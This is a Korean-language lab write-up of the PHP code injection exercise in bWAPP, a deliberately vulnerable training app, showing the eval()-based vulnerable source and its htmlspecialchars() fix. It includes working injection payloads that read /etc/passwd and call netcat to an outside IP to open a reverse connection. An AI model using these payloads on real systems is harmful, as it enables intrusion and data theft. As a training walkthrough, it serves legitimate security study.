---
layout: single
title: (bWAPP)PHP Code Injection
categories: Web-vuln
tag: [php injection, php, injection, bwapp, bee box, php code injection, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

# 검증 로직

```php
<?php

if(isset($_REQUEST["message"]))
{
    // If the security level is not MEDIUM or HIGH
    if($_COOKIE["security_level"] != "1" && $_COOKIE["security_level"] != "2")
    {
?>
    <p><i><?php @eval ("echo " . $_REQUEST["message"] . ";");?></i></p>
<?php
    }
    // If the security level is MEDIUM or HIGH
    else
    {
?>
    <p><i><?php echo htmlspecialchars($_REQUEST["message"], ENT_QUOTES, "UTF-8");;?></i></p>
<?php
    }
}s
?>
```
## Level - Low
![그림 1-1](/assets/image/bwapp/php-code-injection/image.png)

```php
<p><i><?php @eval ("echo " . $_REQUEST["message"] . ";");?></i></p>
```

- 해당 문제에 주어지는 LOW Level 소스코드는 위와 같다.
- eval 함수를 사용하여 사용자의 입력값을 실행하도록 되어 있다.
> eval() 함수란 사용자의 입력값으로 들어온 문자열을 해당 Server Side Script 의 코드로 인식하여 실행하는 함수이다. 이 때 입력값으로 들어온 문자열이 시스템 명령 함수가 존재할 경우 시스템 함수를 실행시킨다.

- 해당 LOW Level 에서 아무런 사용자 입력 값에 대한 유효성 검살를 하지 않고 바로 eval() 함수를 사용한다. 

```
/bWAPP/phpi.php?message=hello
```

![그림 1-2](/assets/image/bwapp/php-code-injection/image2.png)
- 입력값이 echo 명령과 합쳐지면 페이지에 출력되는것을 확인했다. 

```
/bWAPP/phpi.php?message=system(%27head%20-3%20/etc/passwd%27)
```

- 위와 같이 php system 명령어를 인자로 넘겨줬다.
![그림 1-3](/assets/image/bwapp/php-code-injection/image3.png)
- system() 명령이 성공적으로 실행된 걸 확인할 수 있다.
- 이를통해 Reverse Shell Connection또한 가능하다.

```
/bWAPP/phpi.php?message=system(%27nc%20192.168.146.137%205252%27)
```

![그림 1-4](/assets/image/bwapp/php-code-injection/image4.png)
- 성공적으로 Reverse Connection이 맺어진 걸 볼 수 있다.

## Level - Medium & High

```php
<?php echo htmlspecialchars($_REQUEST["message"], ENT_QUOTES, "UTF-8");;?>
```

- LOW Level 을 제외한 단계에서는 htmlspcialchars() 함수를 사용하여 메타문자 입력을 금지하고 있다.

- 이를 통해 LOW Level 과 같이 치명적인 공격은 불가능 하며, php의 경우 phpinfo() 를 통해 사용중인 php 정보 확인과 같은 취약점 판별은 가능하다

```
/bWAPP/phpi.php?message=phpinfo()
```

![그림 1-5](/assets/image/bwapp/php-code-injection/image5.png)
